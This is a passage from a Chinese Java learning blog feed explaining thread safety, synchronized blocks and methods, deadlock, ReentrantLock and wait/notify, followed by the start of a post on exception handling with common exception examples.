id="线程的安全性问题">线程的安全性问题</h3><p>当我们多个线程同时去对同一个参数进行操作时，我们往往会发现，这个参数出现多个线程同时操作时出现只操作一次的情况，举个售票的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">ticketWindows</span> <span class="variable">ticketWindows</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ticketWindows</span>();</span><br><span class="line">      <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(ticketWindows);</span><br><span class="line">      <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(ticketWindows);</span><br><span class="line">      <span class="type">Thread</span> <span class="variable">t3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(ticketWindows);</span><br><span class="line">      t1.setName(<span class="string">&quot;Window1&quot;</span>);</span><br><span class="line">      t2.setName(<span class="string">&quot;Window2&quot;</span>);</span><br><span class="line">      t3.setName(<span class="string">&quot;Window3&quot;</span>);</span><br><span class="line">      t1.start();</span><br><span class="line">      t2.start();</span><br><span class="line">      t3.start();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ticketWindows</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span>(ticket &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot; sell:&quot;</span> + ticket);</span><br><span class="line">            ticket--;</span><br><span class="line">         &#125;<span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们执行如上代码，在控制台，我们发现一个严重的问题，窗口1、2、3出现了售出同一张票的情况：</p><p><img src="https://image.icewindy.cn/202205211739097.png" alt="image-20220521173909064"></p><p>这种就是线程的安全问题。解决方式就是当线程A在操作的时候，其他线程无法参与，直到线程A操作完成后，其他线程才可以开始操作，即使线程A出现阻塞也无法参与。</p><h4 id="同步机制解决线程安全问题">同步机制解决线程安全问题</h4><p><strong>方式一：同步代码块</strong></p><p>结构如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span>(同步监视器)&#123;</span><br><span class="line"><span class="comment">//需要被同步的代码：操作共享数据的代码。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>共享数据：多个线程共同操作的变量，比如：ticket；</p><p>同步监视器：俗称锁。任何一个类的对象都可以充当锁，但要求多个线程必须共用同一个锁。</p><p>例1：</p><p>我们将上面卖票窗口的代码修改为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ticketWindows</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">         <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(ticket &gt; <span class="number">0</span>) &#123;</span><br><span class="line">               System.out.println(Thread.currentThread().getName() + <span class="string">&quot; sell:&quot;</span> + ticket);</span><br><span class="line">               ticket--;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们再去检查控制台，发现没有再次出现重票错票的情况了。</p><p>但是当我们通过继承Thread的方式去创建多线程的时候，我们就发现了一个问题——他仍然出现了错票重票的情况。我们前面提到锁必须多个线程共用一个，而当我们通过继承Thread的方式创建多线程的时候，我们使用的锁<code>this</code>指代的对象并不是指代的同一个，而分别是<code>t1, t2, t3</code>，因此锁就失效了，因此我们作出对应的修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="keyword">synchronized</span> (ticketWindows.class) &#123;</span><br><span class="line"><span class="keyword">if</span>(ticket &gt; <span class="number">0</span>) &#123;</span><br><span class="line">System.out.println(Thread.currentThread().getName() + <span class="string">&quot; sell:&quot;</span> + ticket);</span><br><span class="line">ticket--;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反射的知识，我们可以直接将<code>ticketWindows</code>作为一个对象，充当了锁，因为<code>t1, t2, t3</code>内的<code>ticketWindows</code>都是共用的一个对象，因此，我们就没有出现线程的安全性问题了。</p><p>注意，我们用synchronized代码块包含代码时，我们仅需将操作共享数据的代码包起来即可，不能包多，包多可能会与实际情况相违背了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> (ticketWindows.class) &#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(ticket &gt; <span class="number">0</span>) &#123;</span><br><span class="line">         System.out.println(Thread.currentThread().getName() + <span class="string">&quot; sell:&quot;</span> + ticket);</span><br><span class="line">         ticket--;</span><br><span class="line">      &#125;<span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例如这种情况，我们就会出现一个线程在操作，其他线程全部没有使用的情况。</p><p><strong>方式二：同步方法</strong></p><p>在方法定义出加上synchronized关键词可以将方法变成同步方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>同步方法同样是存在锁的，它的锁是<code>this</code>，因此对于继承<code>Thread</code>方法创建的多线程，直接如上使用的话一样是存在线程的安全性问题的。我们可以通过将方法写为静态的方式，解决这个问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>由于静态方法里面不能使用<code>this</code>，所以它的锁自然而然的就变成类<code>ticketWindows.class</code>。</p><p><strong>总结</strong></p><p>使用同步机制，我们解决线程的安全问题，但操作同步代码时，只能由一个线程参与，其他线程只能等待，相当于是一个单线程的过程，效率不太高。</p><p><strong>懒汉式单例改写为线程安全式</strong></p><p>在多线程调用懒汉式的<code>getInstance</code>方法时，如果我们不做保证线程安全性问题的措施，我们有可能会出现多个线程同时进入了if语句内，导致创建了多个实例，不能实现我们单例设计模式的目的。因此我们需要通过上面所学的知识，解决线程安全性问题，首先是同步方法和同步代码块的方式解决：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Bank <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(bank == <span class="literal">null</span>)&#123;</span><br><span class="line">      bank = <span class="keyword">new</span> <span class="title class_">Bank</span>();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> bank;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Bank <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">synchronized</span> (Bank.class) &#123;</span><br><span class="line"><span class="keyword">if</span>(bank == <span class="literal">null</span>)&#123;</span><br><span class="line">bank = <span class="keyword">new</span> <span class="title class_">Bank</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> bank;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但者两种方式效率并不是很高，表面上是多线程执行，但实际上只能同时进行一个操作，与之前所提到的例子不同，单例设计模式线程安全性问题仅会出现在不存在实例的时候，因此我们可以在外面再包多一次if语句判断是否已经存在实例，这样就只会在实例不存在的时候，进入一次同步代码块，这样效率就高很多了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Bank <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(bank == <span class="literal">null</span>)&#123;</span><br><span class="line">      <span class="keyword">synchronized</span> (Bank.class) &#123;</span><br><span class="line">         <span class="keyword">if</span>(bank == <span class="literal">null</span>)&#123;</span><br><span class="line">            bank = <span class="keyword">new</span> <span class="title class_">Bank</span>();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> bank;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>线程的死锁问题</strong></p><p>死锁：不同的线程分别占用对方需要的同步资源不放弃，都在等待对方放出自己需要的同步资源，就形成了线程的死锁。出现死锁后，不会出现异常，不会出现提示，但所有的线程都会处于阻塞状态，无法继续执行。</p><p>我们构造两个线程，第一个线程先握住s1锁，再握住s2锁，第二个线程先握住s2锁，再握住s1锁：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">StringBuffer</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">      <span class="type">StringBuffer</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">         <span class="meta">@Override</span></span><br><span class="line">         <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (s1) &#123;</span><br><span class="line">               s1.append(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">               s2.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                  Thread.sleep(<span class="number">100</span>);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                  e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">synchronized</span> (s2) &#123;</span><br><span class="line">                  s1.append(<span class="string">&quot;b&quot;</span>);</span><br><span class="line">                  s2.append(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">                  System.out.println(s1);</span><br><span class="line">                  System.out.println(s2);</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;).start();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">         <span class="meta">@Override</span></span><br><span class="line">         <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (s2) &#123;</span><br><span class="line">               s1.append(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">               s2.append(<span class="string">&quot;3&quot;</span>);</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                  Thread.sleep(<span class="number">100</span>);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                  e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">synchronized</span> (s1) &#123;</span><br><span class="line">                  s1.append(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">                  s2.append(<span class="string">&quot;4&quot;</span>);</span><br><span class="line"></span><br><span class="line">                  System.out.println(s1);</span><br><span class="line">                  System.out.println(s2);</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;).start();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现，控制台它什么都没有显示，什么都没有提示：</p><p><img src="https://image.icewindy.cn/202205231919190.png" alt="image-20220523191927155"></p><p>这是因为线程1抢到了s1锁，然后线程2抢到了s2锁，但是线程1又需要s2锁才能继续执行，而线程2有需要s1锁才能继续执行，然后二者就僵持住了，导致了这个结果。</p><p>解决方式：</p><ul><li>专门的算法、原则</li><li>尽量减少同步资料的定义</li><li>尽量减少嵌套同步</li></ul><h4 id="lock锁解决线程安全问题">Lock锁解决线程安全问题</h4><p>Lock锁是JDK5.0新增的更强大的线程同步机制，通过显式定义同步锁对象来实现同步，同步锁使用Lock对象充当。</p><p>使用的步骤：</p><ol><li>定义一个ReentrantLock类的对象，构造器内可以选择是否启用公平机制，如果填入true的话，Lock锁就会按先来后到的顺序安排线程，而不是抢占式，默认不填构造器即false</li><li>使用try-finally环绕包含执行操作过程，并在操作过程前调用锁定方法lock()</li><li>在finally内调用解锁方法unlock()</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ticketWindows</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">   <span class="comment">// 定义一个ReentrantLock类的对象</span></span><br><span class="line">   <span class="keyword">private</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>(<span class="literal">true</span>);</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 调用锁定方法lock()</span></span><br><span class="line">            lock.lock();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">               Thread.sleep(<span class="number">100</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(ticket &gt; <span class="number">0</span>) &#123;</span><br><span class="line">               System.out.println(Thread.currentThread().getName() + <span class="string">&quot; sell:&quot;</span> + ticket);</span><br><span class="line">               ticket--;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">         &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 调用解锁方法unlock()</span></span><br><span class="line">            lock.unlock();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="synchronized与lock锁差别">synchronized与Lock锁差别</h4><ul><li>Lock锁是手动锁定与解锁，是显式锁，而synchronized机制是相应代码执行完后自动解锁线程</li><li>Lock只有代码块锁，synchronized有代码锁和方法锁</li><li>Lock锁由于比较后出现，优化较好，JVM将使用较少时间来调度线程，性能更好，而且提供了更多子类</li><li>优先使用顺序：Lock ——&gt; 同步代码块 ——&gt; 同步方法</li></ul><h3 id="线程的通信">线程的通信</h3><p>涉及到的方法：</p><ul><li>wait()：执行该方法会使当前线程进入阻塞状态，并释放锁</li><li>notify()：执行此方法会唤醒的被wait的线程，如果多个线程都被wait，则优先唤醒优先度高的线程</li><li>notifyAll()：执行此方法会唤醒全部被wait的线程</li></ul><p>例：使用两个线程交替售票</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ticketWindows</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">         <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">            notify();</span><br><span class="line">            <span class="keyword">if</span>(ticket &gt; <span class="number">0</span>) &#123;</span><br><span class="line">               System.out.println(Thread.currentThread().getName() + <span class="string">&quot; sell:&quot;</span> + ticket);</span><br><span class="line">               ticket--;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">               wait();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体思路就是通过wait()阻塞线程1，然后让线程2拿到锁再去唤醒线程1，执行完线程2操作后线程2进入阻塞，以此循环。</p><p><strong>注意点</strong></p><ol><li>wait()，notify()，notifyAll()三个方法必须使用在同步代码块或同步方法中</li><li>wait()，notify()，notifyAll()三个方法调用者必须是同步代码块或同步方法的同步监视器，否则会出现异常</li><li>wait()，notify()，notifyAll()三个方法式定义在java.lang.Object类中</li></ol><p><strong>sleep()与wait()异同</strong></p><ul><li>同：都会进入阻塞状态</li><li>sleep()定义在Thread类中，wait()定义在Object类中</li><li>调用的范围：sleep()可以在任何情景下调用，wait()必须在同步代码块和同步方法中</li><li>sleep()不会释放锁，wait()会释放锁</li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java笔记（8）：异常处理</title>
      <link href="/2022/05/10/Java%E7%AC%94%E8%AE%B0%EF%BC%888%EF%BC%89%EF%BC%9A%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"/>
      <url>/2022/05/10/Java%E7%AC%94%E8%AE%B0%EF%BC%888%EF%BC%89%EF%BC%9A%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="异常处理">异常处理</h2><h3 id="概述">概述</h3><p>异常是程序在执行过程中发生不正常的情况。</p><p>Java程序的异常情况分为两类：</p><ul><li>**Error：**Java虚拟机无法解决的严重问题。如JVM内部错误、资源耗尽等。一般不编写针对性代码处理。</li><li>**Exception：**其他由于编程出错或者偶发性的外在因素导致的一般性错误，则可以通过针对性的代码进行处理。如：空指针访问，试图读取不存在的文件，网络中断，数组越界等等情况。</li></ul><p>对于异常，我们拥有两种办法：第一种是不处理，直接终止程序运行。另外一种就是在编写程序的过程中，将异常的处理方法写入代码中。</p><h3 id="常见异常">常见异常</h3><h4 id="运行时异常">运行时异常</h4><ul><li><p>NullPointerException 空指针</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] arr = <span class="literal">null</span>;</span><br><span class="line">System.out.println(arr[<span class="number">3</span>]);</span><br></pre></td></tr></table></figure></li><li><p>ArrayIndexOutOfBoundsException 数组越界</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">System.out.println(arr[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure></li><li><p>ClassCastException 类型转换错误</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String) obj;</span><br></pre></td></tr></table></figure></li><li><p>NumberFormatException</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;abc&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> Integer.parseInt(str);</span><br></pre></td></tr></table></figure></li><li><p>InputMismatchException</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">System.out.println(score);</span><br></pre></td></tr></table></figure><p>当你输入内容为非int类型时，就会报出错误。</p></li><li><p>ArithmeticException 算术异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">System.out.println(a / b);</span><br></pre></td></tr></table></figure></li></ul><h4 id="编译时异常">编译时异常</h4><ul><li><p>IOException</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;hello.txt&quot;</span>);</span><br><span class="line"><span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line"><span class="type">int</span> <span class="variable">data</span> <span class="operator">=</span> fis.read();</span><br><span class="line"><span class="keyword">while</span> (data != -<span class="number">1</span>) &#123;</span><br><span class="line">   System.out.print((<span class="type">char</span>) data);</span><br><span class="line">   data = fis.read();</span><br><span class="line">&#125;</span><br><span class="line">fis.close();</span><br></pre></td></tr></table></figure><p>这种编译是无法通过的。</p></li></ul><h3 id="异常处理">异常处理</h3><p>在编写程序时候，我们往往需要<code>if-else</code>分支对可能出现错误的地方进行检测，但是过多的<code>if-else</code>分支会导致代码过于臃肿。异常处理机制可以将异常处理的代码集中在一起，与正常代码分开，减少过多<code>if-else</code>分支。</p><p>Java有两种异常处理的方式，分别是<code>try-catch-finally</code>方式与<code>throws</code>方式。<code>try-catch-finally</code>方式是自行解决，<code>throws</code>方式是上报的方式，让上面去解决。</p><p>Java的异常处理是一个“抓抛模型”：“抛”是指程序执行的过程中，如果出现异常，就会生成一个对应异常类的对象，并将此对象抛出，一旦抛出异常对象以后，其后代码将不再执行。“抓”是抓取到异常对象后，对异常的处理——try-catch-finally和throws。</p><h4 id="try-catch-finally方式">try-catch-finally方式</h4><p><strong>结构：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="comment">//可能出现异常的代码</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(异常类型<span class="number">1</span> 变量<span class="number">1</span>)&#123;</span><br><span class="line"><span 